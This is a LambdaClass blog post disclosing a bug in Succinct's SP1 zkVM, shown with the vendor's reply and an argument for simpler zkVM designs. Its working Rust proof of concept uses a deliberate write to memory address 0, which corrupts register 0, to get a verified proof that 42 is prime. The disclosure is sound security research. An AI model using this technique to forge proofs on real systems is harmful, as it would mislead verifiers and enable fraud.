<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>The future of ZK is in RISC-V zkVMs, but the industry must be careful: how Succinct&#x27;s SP1&#x27;s departure from standards causes bugs - LambdaClass Blog</title>
    <meta name="description" content="Deep technical insights on cryptography, distributed systems, zero-knowledge proofs, and cutting-edge software engineering from the LambdaClass team.">

    <!-- Feeds -->
    <link rel="alternate" type="application/rss+xml" title="RSS" href="https://blog.lambdaclass.com/rss.xml">
    <link rel="alternate" type="application/atom+xml" title="Atom" href="https://blog.lambdaclass.com/atom.xml">

    <!-- Styles -->
    <link rel="stylesheet" href="https://blog.lambdaclass.com/style.css">

    <!-- Preload fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">

    <!-- Math rendering -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css">
    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"></script>
    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body, {delimiters: [{left: '$$', right: '$$', display: true}, {left: '$', right: '$', display: false}]});"></script>
</head>
<body>
    <div class="site-wrapper">
        <header class="site-header">
            <nav class="nav-container">
                <a href="https://blog.lambdaclass.com" class="site-logo">
                    <span class="logo-text">LambdaClass</span>
                </a>
                <div class="nav-links">
                    <a href="https://blog.lambdaclass.com" >Home</a>
                    <a href="https://blog.lambdaclass.com/tags" >Topics</a>
                    <a href="https://github.com/lambdaclass" target="_blank" rel="noopener">GitHub</a>
                    <a href="https://x.com/class_lambda" target="_blank" rel="noopener">X</a>
                    <button class="theme-toggle" id="theme-toggle" aria-label="Toggle theme">
                        <svg class="sun-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
                        <svg class="moon-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
                    </button>
                </div>
            </nav>
        </header>

        <main class="site-main">
            
<article class="page-article">
    <header class="page-header">
        <h1 class="page-title">The future of ZK is in RISC-V zkVMs, but the industry must be careful: how Succinct&#x27;s SP1&#x27;s departure from standards causes bugs</h1>
        
        <div class="page-meta">
            <time datetime="2024-12-21">December 21, 2024</time>
        </div>
        
    </header>

    <div class="page-content prose">
        <h2 id="why-you-should-avoid-having-complex-codebases-and-departing-from-standards-when-developing-zero-knowledge-virtual-machines">Why you should avoid having complex codebases and departing from standards when developing zero-knowledge virtual machines</h2>
<p><strong>TL;DR</strong> : We found a subtle bug in Succinct’s SP1 virtual machine, which allows a malicious user to prove the validity of false statements by subtly manipulating register 0 in the guest code</p>
<p>This was found thanks to a collaboration between <a rel="noopener external" target="_blank" href="https://www.3milabs.tech/">3MI Labs</a>, <a rel="noopener external" target="_blank" href="https://docs.alignedlayer.com/">Aligned</a>, and <a rel="noopener external" target="_blank" href="https://lambdaclass.com/">LambdaClass</a>.</p>
<p>LambdaClass and <a rel="noopener external" target="_blank" href="https://fuzzinglabs.com/">Fuzzing Labs</a> will invest in further investigating critical security bugs in zkvms. We believe that codebases have become too complex and over-engineered and this gives rise to lots of bugs. We think that the industry is at risk if we do not invest, add more eyes and simplify codebases. The industry has become complacent when it comes to security and is being pushed by business decisions to rush into production use, leaving aside these security issues, which could lead to very serious consequences. In this post, we analyze the case of SP1, but we think that all zkvm’s codebases need to be simplified and follow the standards, lowering the attack surface. As mentioned, we will conduct a more thourough research on different zkvms.</p>
<h2 id="introduction">Introduction</h2>
<p>We have seen the development of long and complex codebases in several engineering projects, with too many features and poor documentation and testing. Some people believe that having such codebases shows that you are smart, have excellent coding skills, and have given a lot of thought to everything. We think otherwise: the proof of mastery lies in simplicity. Bugs will always happen in any project, but the chance of having critical bugs increases with codebase complexity and length in a nonlinear way: the longer and more complex, the more bugs and hard-to-predict behaviors you can have.</p>
<p>During our analysis of zk virtual machines and proof systems, we found a bug in Succinct’s SP1 virtual machine, which allows a malicious actor to generate a valid proof of malicious programs (proving that a false statement is true). We disclosed our concerns to Succinct’s team, and they replied that this was <a rel="noopener external" target="_blank" href="https://x.com/jtguibas/status/1862301417870148082">within their security assumptions</a> and is <a rel="noopener external" target="_blank" href="https://github.com/succinctlabs/sp1/blob/dev/book/docs/developers/rv32im-deviations.md">currently included in their documentation</a>:</p>
<blockquote>
<p>We discussed these issues with several auditors and concluded that the most important thing is that this deviation was well-documented and communicated, so we’re updating our docs to reflect that. We do not believe this is a security concern since programs proven in our zkVM are already assumed to be well-formed and not malicious. In other words, while you can prove the execution of the malicious program, the resulting proof is meaningless if the program is corrupt.</p>
</blockquote>
<p>We like Succinct’s work and think their virtual machine has sparked a lot of good competition to improve current zkvm designs and helped show that the future of ZK is in RISC-V virtual machines. We have been playing and experimenting with it a lot and are considering using it in some of our projects. We also liked that they responded fast to our findings, and although we disagreed with their criteria, they took our concerns seriously.</p>
<p>From our point of view, this bug arises from a departure from the RISC-V specs and the complexity of the codebase. We think that more care needs to be taken when designing, developing, and testing zk virtual machines that could be used in real-world applications, and try to minimize the attack surface by not going into unchartered territory.</p>
<h2 id="description-of-the-bug">Description of the bug</h2>
<p>This example shows that an SP1 proof can be glitched with an appropriately targeted memory write. We will use this to prove that 42 is prime using a simple primality test:</p>
<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="plain"><span class="giallo-l"><span>// Returns if divisible via immediate checks than 6k ± 1.</span></span>
<span class="giallo-l"><span>// Source: https://en.wikipedia.org/wiki/Primality_test#Rust</span></span>
<span class="giallo-l"><span>fn is_prime(n: u64) -&gt; bool {</span></span>
<span class="giallo-l"><span>    if n &lt;= 1 {</span></span>
<span class="giallo-l"><span>        return false;</span></span>
<span class="giallo-l"><span>    }</span></span>
<span class="giallo-l"><span>    if n &lt;= 3 {</span></span>
<span class="giallo-l"><span>        return true;</span></span>
<span class="giallo-l"><span>    }</span></span>
<span class="giallo-l"><span>    if n % 2 == 0 || n % 3 == 0 {</span></span>
<span class="giallo-l"><span>        return false;</span></span>
<span class="giallo-l"><span>    }</span></span>
<span class="giallo-l"><span>    let mut i = 5;</span></span>
<span class="giallo-l"><span>    while i * i &lt;= n {</span></span>
<span class="giallo-l"><span>        if n % i == 0 || n % (i + 2) == 0 {</span></span>
<span class="giallo-l"><span>            return false;</span></span>
<span class="giallo-l"><span>        }</span></span>
<span class="giallo-l"><span>        i += 6;</span></span>
<span class="giallo-l"><span>    }</span></span>
<span class="giallo-l"><span>    true</span></span>
<span class="giallo-l"><span>}</span></span></code></pre>
<p>Using the following guest program (using i/o is unnecessary for the bug):</p>
<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="plain"><span class="giallo-l"><span>pub fn main() {</span></span>
<span class="giallo-l"><span>    let what: u8 = sp1_zkvm::io::read();</span></span>
<span class="giallo-l"><span>    let where_: u32 = sp1_zkvm::io::read();</span></span>
<span class="giallo-l"></span>
<span class="giallo-l"><span>    let n = sp1_zkvm::io::read::&lt;u64&gt;();</span></span>
<span class="giallo-l"></span>
<span class="giallo-l"><span>    // We can have a little write, as a treat</span></span>
<span class="giallo-l"><span>    unsafe {</span></span>
<span class="giallo-l"><span>        *(where_ as *mut u8) = what;</span></span>
<span class="giallo-l"><span>    }</span></span>
<span class="giallo-l"><span>    let is_prime = is_prime(n);</span></span>
<span class="giallo-l"></span>
<span class="giallo-l"><span>    sp1_zkvm::io::commit(&amp;n);</span></span>
<span class="giallo-l"><span>    sp1_zkvm::io::commit(&amp;is_prime);</span></span>
<span class="giallo-l"><span>}</span></span></code></pre>
<p>Then the proving script is executed,</p>
<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="plain"><span class="giallo-l"><span>//! A program that takes a number `n` as input and writes if `n` is prime as an output.</span></span>
<span class="giallo-l"><span>use sp1_sdk::{utils, ProverClient, SP1Stdin};</span></span>
<span class="giallo-l"></span>
<span class="giallo-l"><span>// Generated with `cargo prove build --docker --elf-name is-prime-write --output-directory elf`</span></span>
<span class="giallo-l"><span>// in the program directory</span></span>
<span class="giallo-l"><span>const ELF: &amp;[u8] = include_bytes!(&quot;../../../program/elf/is-prime-write&quot;);</span></span>
<span class="giallo-l"><span>const FILENAME: &amp;&#39;static str = &quot;is-prime-write.proof&quot;;</span></span>
<span class="giallo-l"></span>
<span class="giallo-l"><span>fn main() {</span></span>
<span class="giallo-l"><span>    // Setup a tracer for logging.</span></span>
<span class="giallo-l"><span>    utils::setup_logger();</span></span>
<span class="giallo-l"></span>
<span class="giallo-l"><span>    // Generate and verify the proof</span></span>
<span class="giallo-l"><span>    let client = ProverClient::new();</span></span>
<span class="giallo-l"><span>    let (pk, vk) = client.setup(ELF);</span></span>
<span class="giallo-l"><span>    // Create an input stream and write &#39;29&#39; to it</span></span>
<span class="giallo-l"><span>    let n = 42u64;</span></span>
<span class="giallo-l"></span>
<span class="giallo-l"><span>    let mut stdin = SP1Stdin::new();</span></span>
<span class="giallo-l"><span>    stdin.write(&amp;1u8); // what</span></span>
<span class="giallo-l"><span>    stdin.write(&amp;0u32); // where</span></span>
<span class="giallo-l"><span>    stdin.write(&amp;n);</span></span>
<span class="giallo-l"></span>
<span class="giallo-l"><span>    let mut proof = client.prove(&amp;pk, stdin).compressed().run().unwrap();</span></span>
<span class="giallo-l"><span>    let _ = proof.public_values.read::&lt;u64&gt;();</span></span>
<span class="giallo-l"><span>    let is_prime = proof.public_values.read::&lt;bool&gt;();</span></span>
<span class="giallo-l"><span>    println!(&quot;Is {n} prime? {}&quot;, is_prime);</span></span>
<span class="giallo-l"><span>    client.verify(&amp;proof, &amp;vk).expect(&quot;verification failed&quot;);</span></span>
<span class="giallo-l"><span>    proof.save(FILENAME).expect(&quot;saving proof failed&quot;);</span></span>
<span class="giallo-l"><span>}</span></span></code></pre>
<p>This program reads three inputs: the content of the memory write (what), the target address of the memory write (where), and a number for primality testing. (It also contains the ELF compiled version as program/elf/is-prime-write.). Register 0 should always be zero, and cannot be changed according to RISC-V specs. Due to the bug, we can change it in the guest code, making statements that should be false to change to true.</p>
<p>After performing the memory write of the given content at the given address, the program tests whether the given input <code>n</code> is a prime number. The <code>is_prime()</code> function in <code>main.rs</code>(./program/src/main.rs) is a correct primality test that should return <code>false</code> on input <code>42</code>. The program finally commits to the input <code>n</code> that it was given, as well as the result of the primality test; these are the public values displayed by the verifier binary, showing that the <code>is_prime()</code> function incorrectly returned <code>true</code> when the program’s input was <code>42</code>.</p>
<p>The <code>script</code> directory contains the minimal rust binary <code>verifier.rs</code>(./script/src/bin/verifier.rs), which verifies that the proof given in <code>script/is-prime-write.proof</code> declares that 42 is a prime number. This can be checked by running the following commands.</p>
<pre class="giallo" style="color: #E1E4E8; background-color: #24292E;"><code data-lang="plain"><span class="giallo-l"><span>cd script/</span></span>
<span class="giallo-l"><span>cargo run</span></span>
<span class="giallo-l"></span>
<span class="giallo-l"></span>
<span class="giallo-l"><span>//! A program that takes a number `n` as input and writes if `n` is prime as an output.</span></span>
<span class="giallo-l"><span>use sp1_sdk::{utils, ProverClient, SP1ProofWithPublicValues};</span></span>
<span class="giallo-l"></span>
<span class="giallo-l"><span>// Generated with `cargo prove build --docker --elf-name is-prime-write --output-directory elf`</span></span>
<span class="giallo-l"><span>// in the program directory</span></span>
<span class="giallo-l"><span>const ELF: &amp;[u8] = include_bytes!(&quot;../../../program/elf/is-prime-write&quot;);</span></span>
<span class="giallo-l"><span>const FILENAME: &amp;&#39;static str = &quot;is-prime-write.proof&quot;;</span></span>
<span class="giallo-l"></span>
<span class="giallo-l"><span>fn main() {</span></span>
<span class="giallo-l"><span>    // Setup a tracer for logging.</span></span>
<span class="giallo-l"><span>    utils::setup_logger();</span></span>
<span class="giallo-l"></span>
<span class="giallo-l"><span>    // Generate and verify the proof</span></span>
<span class="giallo-l"><span>    let client = ProverClient::new();</span></span>
<span class="giallo-l"><span>    let (_, vk) = client.setup(ELF);</span></span>
<span class="giallo-l"></span>
<span class="giallo-l"><span>    // Verifier code</span></span>
<span class="giallo-l"><span>    let mut deserialized_proof =</span></span>
<span class="giallo-l"><span>        SP1ProofWithPublicValues::load(FILENAME).expect(&quot;loading proof failed&quot;);</span></span>
<span class="giallo-l"></span>
<span class="giallo-l"><span>    // Verify the deserialized proof.</span></span>
<span class="giallo-l"><span>    client</span></span>
<span class="giallo-l"><span>        .verify(&amp;deserialized_proof, &amp;vk)</span></span>
<span class="giallo-l"><span>        .expect(&quot;verification failed&quot;);</span></span>
<span class="giallo-l"></span>
<span class="giallo-l"><span>    // Now that it&#39;s accepted</span></span>
<span class="giallo-l"><span>    let n: u64 = deserialized_proof.public_values.read();</span></span>
<span class="giallo-l"><span>    let is_prime: bool = deserialized_proof.public_values.read();</span></span>
<span class="giallo-l"><span>    println!(&quot;Verifier: Is {n} prime? {is_prime}&quot;);</span></span>
<span class="giallo-l"><span>}</span></span></code></pre>
<p>While this example is naïf (since we can easily see that 42 is not prime due to it being an even number), this idea could be exploited for more subtle attacks, including supply chain attacks. While the change in the guest program is pretty obvious in this case, in others where the codebase is more complex and there are multiple dependencies it can be way harder to detect.<br />
The assumption that programs are always correctly generated and do not have bugs is against common sense in the software industry and could result in serious vulnerabilities. Moreover, departing from well-established standards makes the reasoning over expected behavior difficult and can lead to more complex and subtle bugs.</p>
<h2 id="summary">Summary</h2>
<p>Working with 3MI Labs and Aligned, we found a bug in how SP1 handles the memory register (in particular, register 0), which can allow an attacker to prove a false statement. This results from a departure of the RISC-V specs and a complex codebase. This makes reasoning over expected behavior very difficult, as it could also give rise to unexpected and subtle bugs, which can have critical consequences in real-world settings. We must continue testing, analyzing, and trying to find bugs and unexpected behaviors in zk virtual machines to minimize risks when used in real-world use cases.</p>

    </div>
</article>

        </main>

        <footer class="site-footer">
            <div class="footer-container">
                <div class="footer-content">
                    <p class="footer-copyright">&copy; 2026 LambdaClass. All rights reserved.</p>
                    <div class="footer-links">
                        <a href="https://github.com/lambdaclass" target="_blank" rel="noopener">GitHub</a>
                        <a href="https://x.com/class_lambda" target="_blank" rel="noopener">X</a>
                        <a href="https://blog.lambdaclass.com/rss.xml">RSS</a>
                    </div>
                </div>
            </div>
        </footer>
    </div>

    <script>
        // Theme toggle functionality
        const themeToggle = document.getElementById('theme-toggle');
        const html = document.documentElement;

        // Check for saved preference or system preference
        const savedTheme = localStorage.getItem('theme');
        const systemPrefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;

        if (savedTheme) {
            html.setAttribute('data-theme', savedTheme);
        } else if (systemPrefersDark) {
            html.setAttribute('data-theme', 'dark');
        }

        themeToggle.addEventListener('click', () => {
            const currentTheme = html.getAttribute('data-theme');
            const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
            html.setAttribute('data-theme', newTheme);
            localStorage.setItem('theme', newTheme);
        });
    </script>
</body>
</html>
